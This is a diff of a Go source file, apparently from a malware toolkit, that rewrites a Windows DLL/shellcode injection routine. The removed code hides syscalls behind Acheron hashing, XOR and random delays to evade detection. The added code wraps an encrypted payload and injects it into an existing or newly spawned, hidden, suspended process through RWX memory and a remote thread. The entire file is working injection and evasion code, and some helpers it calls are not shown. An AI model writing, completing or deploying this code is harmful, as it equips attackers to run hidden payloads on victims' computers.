@@ -1,112 +1,79 @@
-// process_hollowing_dll.go
 package injection
 
 import (
-	"encoding/binary"
 	"fmt"
-	"math/rand"
-	"time"
+	"path/filepath"
 	"unsafe"
 
-	"github.com/f1zm0/acheron"
 	"golang.org/x/sys/windows"
 )
 
-// DLLInjector ejecuta un DLL en memoria usando hollowing
-type DLLInjector struct {
-	acheron *acheron.Acheron
+type DLLInjector struct{}
+
+func NewDLLInjector() *DLLInjector { return &DLLInjector{} }
+
+func (d *DLLInjector) Inject(targetExe string, payload []byte) error {
+	wrapped := wrapWithDecryptor(payload)
+
+	procName := filepath.Base(targetExe)
+	if pid, err := findPID(procName); err == nil {
+		if err2 := injectExisting(pid, wrapped); err2 == nil {
+			return nil // inyectó en proceso existente
+		}
+	}
+
+	return injectSuspended(targetExe, wrapped)
 }
 
-// NewDLLInjector crea un injector para DLLs
-func NewDLLInjector(ach *acheron.Acheron) *DLLInjector {
-
-	return &DLLInjector{acheron: ach}
-}
-
-// obfuscatedSyscall delega a Acheron con un retraso aleatorio
-func (d *DLLInjector) obfuscatedSyscall(hash uint64, args ...uintptr) (uint32, error) {
-	time.Sleep(time.Duration(100+rand.Intn(300)) * time.Millisecond)
-	return d.acheron.Syscall(hash^ 0xDEADBEEF, args...)
-}
-
-// Inject crea un proceso suspendido, mapea el DLL y lanza un hilo remoto
-func (d *DLLInjector) Inject(targetExe string, dllData []byte) error {
-	// 1) Crear proceso suspendido sin ventana
+func hollowNew(targetExe string, wrapped []byte) error {
 	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
 	pi := &windows.ProcessInformation{}
+
 	cmd, err := windows.UTF16PtrFromString(targetExe)
 	if err != nil {
-		return fmt.Errorf("UTF16PtrFromString: %w", err)
+		return fmt.Errorf("utf16: %w", err)
 	}
-	if err := windows.CreateProcess(
-		nil, cmd, nil, nil, false,
+	if err = windows.CreateProcess(nil, cmd, nil, nil, false,
 		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
-		nil, nil, si, pi,
-	); err != nil {
-		return fmt.Errorf("CreateProcess suspendido: %w", err)
+		nil, nil, si, pi); err != nil {
+		return fmt.Errorf("spawn: %w", err)
 	}
 	defer windows.CloseHandle(pi.Thread)
 	defer windows.CloseHandle(pi.Process)
 
-	// 2) Reservar memoria en el proceso remoto
-	var remoteAddr uintptr
-	size := uintptr(len(dllData))
-	allocHash := d.acheron.HashString("NtAllocateVirtualMemory")
-	if _, err := d.obfuscatedSyscall(
-		allocHash,
-		uintptr(pi.Process),
-		uintptr(unsafe.Pointer(&remoteAddr)),
-		uintptr(0),
-		uintptr(unsafe.Pointer(&size)),
-		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
-		uintptr(windows.PAGE_EXECUTE_READWRITE),
-	); err != nil {
-		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
+	// Alocar, escribir y marcar RWX (stub necesita escribir para descifrar)
+	baseAddr, err := allocAndWrite(pi.Process, wrapped, windows.PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		windows.TerminateProcess(pi.Process, 1)
+		return err
 	}
 
-	// 3) Escribir el DLL en memoria remota
-	writeHash := d.acheron.HashString("NtWriteVirtualMemory")
-	if _, err := d.obfuscatedSyscall(
-		writeHash,
-		uintptr(pi.Process),
-		remoteAddr,
-		uintptr(unsafe.Pointer(&dllData[0])),
-		uintptr(len(dllData)),
-		uintptr(0),
-	); err != nil {
-		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
+	// Resumir el hilo principal PRIMERO para que el proceso inicialice
+	// ws2_32, kernel32, etc. antes de que el shellcode los use.
+	if _, err = windows.ResumeThread(pi.Thread); err != nil {
+		windows.TerminateProcess(pi.Process, 1)
+		return fmt.Errorf("resume: %w", err)
 	}
 
-	// 4) Calcular entrypoint RVA y dirección absoluta
-	peOffset := binary.LittleEndian.Uint32(dllData[0x3C:0x40])
-	optHdr := peOffset + 0x18 // offset al IMAGE_OPTIONAL_HEADER
-	rvaEP := binary.LittleEndian.Uint32(dllData[optHdr+0x10 : optHdr+0x14])
-	entry := remoteAddr + uintptr(rvaEP)
+	// WaitForInputIdle: bloquea hasta que el proceso terminó su startup
+	// y está esperando input (DLLs ya inicializados). Timeout 5s.
+	user32 := windows.NewLazyDLL("user32.dll")
+	user32.NewProc("WaitForInputIdle").Call(uintptr(pi.Process), 5000)
 
-	// 5) Crear hilo remoto para ejecutar DllMain
-	createHash := d.acheron.HashString("NtCreateThreadEx")
+	// Ahora inyectar el thread en el proceso ya inicializado
 	var remoteThread windows.Handle
-	if _, err := d.obfuscatedSyscall(
-		createHash,
+	ret, _ := ntCall(_sCreateThread,
 		uintptr(unsafe.Pointer(&remoteThread)),
 		uintptr(windows.PROCESS_ALL_ACCESS),
-		uintptr(0),
+		0,
 		uintptr(pi.Process),
-		entry,
-		uintptr(0),
-		uintptr(0),
-		uintptr(0),
-		uintptr(0),
-		uintptr(0),
-	); err != nil {
-		return fmt.Errorf("NtCreateThreadEx: %w", err)
+		baseAddr,
+		0, 0, 0, 0, 0,
+	)
+	if ret != 0 {
+		windows.TerminateProcess(pi.Process, 1)
+		return fmt.Errorf("thread: 0x%x", ret)
 	}
 	windows.CloseHandle(remoteThread)
-
-	// 6) Reanudar hilo principal del proceso
-	if _, err := windows.ResumeThread(pi.Thread); err != nil {
-		return fmt.Errorf("ResumeThread: %w", err)
-	}
-
 	return nil
 }
